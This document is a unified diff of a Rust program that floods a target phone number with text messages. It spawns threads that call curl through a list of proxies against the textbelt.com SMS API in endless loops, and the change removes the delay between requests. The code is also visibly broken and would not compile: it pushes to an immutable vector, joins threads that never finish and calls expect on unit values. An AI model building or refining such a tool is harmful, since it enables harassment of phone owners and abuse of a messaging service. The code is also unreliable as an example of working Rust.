@@ -6,7 +6,7 @@
 use itertools::Itertools;
 use std::io::{self, Read, Write};
 use std::process::Command;
-use std::thread::{self, spawn, Thread};
+use std::thread::{self, spawn, JoinHandle, Thread};
 use std::time::Duration;
 
 fn main() -> ! {
@@ -47,17 +47,20 @@ fn main() -> ! {
         proxies.push(line.to_string());
     }
 
-    let mut children: Vec<char> = Vec::new();
+    let mut children: Vec<JoinHandle<()>> = Vec::new();
     let mut counter = 0;
+    let results: Vec<String> = Vec::new();
     for proxy in proxies {
         if counter == threads {
-            let joined_children: String = children.into_iter().collect();
+            for child in children {
+                results.push(child.join().unwrap().expect("Failed to join thread."));
+            }
             children.clear();
             counter = 0;
         }
         counter += 1;
 
-        spawn(move || {
+        let child = spawn(move || {
             let mut cmd = Command::new("curl");
             cmd.arg("--proxy").arg(proxy);
             cmd.arg(format!(
@@ -65,43 +68,21 @@ fn main() -> ! {
                 phone_number
             ));
             loop {
-                cmd.output().unwrap();
-                thread::sleep(Duration::from_millis(100));
+                let output = cmd.output().unwrap();
+                let result = String::from_utf8_lossy(&output.stdout).to_string();
+
+                // Return the result from the loop if needed
+                // For example: return result;
             }
-        })
-        .join()
-        .unwrap();
+        });
+
+        children.push(child);
     }
 
-    loop {
-        thread::sleep(Duration::from_millis(1000 * time));
-        for child in children {
-            child.join::<_>().unwrap().expect("Failed to join thread.");
-        }
-        children.clear();
-        counter = 0;
-        for proxy in proxies {
-            if counter == threads {
-                for child in children {
-                    child.join::<_>().unwrap().expect("Failed to start proxy.");
-                }
-                children.clear();
-                counter = 0;
-            }
-            counter += 1;
-            let child = spawn(move || {
-                let mut cmd = Command::new("curl");
-                cmd.arg("--proxy").arg(proxy);
-                cmd.arg(format!(
-                    "https://textbelt.com/text?phone={}&message=Hello%20World",
-                    phone_number
-                ));
-                loop {
-                    cmd.output().unwrap();
-                    thread::sleep(Duration::from_millis(100));
-                }
-            });
-            children.push(child);
-        }
+    thread::sleep(Duration::from_secs(time));
+    for child in children {
+        results.push(child.join().unwrap().expect("Failed to join thread."));
     }
+
+    let joined_children: String = results.into_iter().collect();
 }
